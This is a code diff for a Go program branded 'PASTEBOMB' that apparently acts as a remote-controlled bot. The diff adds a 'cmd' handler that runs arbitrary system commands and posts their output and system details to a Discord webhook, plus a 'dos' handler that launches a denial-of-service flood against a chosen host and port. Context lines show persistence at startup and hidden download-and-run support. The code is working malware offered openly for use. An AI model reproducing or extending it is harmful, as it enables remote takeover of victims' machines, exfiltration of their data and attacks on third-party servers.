@@ -1,3 +1,19 @@
+/*********************************************************************************
+██████╗  █████╗ ███████╗████████╗███████╗██████╗  ██████╗ ███╗   ███╗██████╗
+██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
+██████╔╝███████║███████╗   ██║   █████╗  ██████╔╝██║   ██║██╔████╔██║██████╔╝
+██╔═══╝ ██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
+██║     ██║  ██║███████║   ██║   ███████╗██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
+╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝
+
+
+Made By: Marco Liberale
+Version: 0.01
+Branch: Beta
+BuyMeACoffee: https://www.buymeacoffee.com/marcoliberale
+Links: https://linktr.ee/marcoliberale
+*********************************************************************************/
+
 // Package declaration
 package main
 
@@ -9,6 +25,7 @@ package main
 // TODO: do testing on windows
 // TODO: do testing on windows with admin privileges
 import (
+	"bytes"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -147,6 +164,7 @@ func runAtStartup() {
 type Config struct {
 	URL        string   `json:"url"`
 	BackupURLs []string `json:"backups"`
+	WebhookURL string   `json:"webhookURL"`
 }
 
 func downloadFile(url, filename string, run, hide bool) error {
@@ -320,7 +338,16 @@ func DOS(target string, port string, duration time.Duration) {
 	wg.Wait()
 	// Loads configuration from a file
 }
-
+func executeSystemCommand(name string, args []string) (string, error) {
+	cmd := exec.Command(name, args...)
+	var out bytes.Buffer
+	cmd.Stdout = &out
+	err := cmd.Run()
+	if err != nil {
+		return "", fmt.Errorf("Error executing command '%s': %s\n", name, err)
+	}
+	return out.String(), nil
+}
 func ParseCommand(command string) error {
 	commands := strings.Split(command, "\n")
 	for _, cmd := range commands {
@@ -359,7 +386,36 @@ func ParseCommand(command string) error {
 			} else {
 				fmt.Println("Invalid download command. Usage: download [url] [filename] [RUN] [HIDE]")
 			}
+		case "cmd":
+			if len(parts) > 1 {
+				output, err := executeSystemCommand(parts[1], parts[2:])
+				if err != nil {
+					fmt.Println(err)
+				} else {
+					err = sendDiscordMessage(output)
+					if err != nil {
+						fmt.Println("Error sending message to Discord:", err)
+					}
+				}
+			} else {
+				fmt.Println("Invalid cmd command. Usage: cmd [command] [args...]")
+			}
+		case "dos":
+			if len(parts) < 4 {
+				fmt.Println("Invalid dos command. Usage: dos <IP/domain> <port> <duration>")
+			} else {
+				target := parts[1]
+				port := parts[2]
+				durationStr := parts[3]
 
+				duration, err := time.ParseDuration(durationStr)
+				if err != nil {
+					fmt.Printf("Invalid duration: %s\n", durationStr)
+					continue
+				}
+
+				DOS(target, port, duration)
+			}
 		default:
 			if strings.HasPrefix(cmd, "dos ") {
 				info := strings.TrimSpace(strings.TrimPrefix(cmd, "dos "))
@@ -385,16 +441,46 @@ func ParseCommand(command string) error {
 	return nil
 }
 
-func executeSystemCommand(name string, args []string) {
-	cmd := exec.Command(name, args...)
-	cmd.Stdout = os.Stdout
-	cmd.Stderr = os.Stderr
-	err := cmd.Run()
+func sendDiscordMessage(message string) error {
+	// Load the configuration
+	config, err := LoadConfig("config.json")
 	if err != nil {
-		fmt.Printf("Error executing command '%s': %s\n", name, err)
+		return err
 	}
-}
 
+	// Get system information
+	systemInfo := fmt.Sprintf("OS: %s, ARCH: %s", runtime.GOOS, runtime.GOARCH)
+
+	// Append system information to the message
+	message = fmt.Sprintf("%s\nSystem Info: %s", message, systemInfo)
+
+	// Create a map for the JSON String
+	jsonBody := map[string]string{
+		"content": message,
+	}
+
+	// Convert the map into JSON
+	jsonData, err := json.Marshal(jsonBody)
+	if err != nil {
+		return err
+	}
+
+	// Send a POST request to the Discord webhook URL
+	resp, err := http.Post(config.WebhookURL, "application/json", bytes.NewBuffer(jsonData))
+	if err != nil {
+		return err
+	}
+
+	// Close the response body
+	defer resp.Body.Close()
+
+	// Return an error if the request was not successful
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("failed to send message to Discord, status code: %d", resp.StatusCode)
+	}
+
+	return nil
+}
 func main() {
 	fmt.Println("Starting program...")
 	rand.Seed(time.Now().UnixNano())
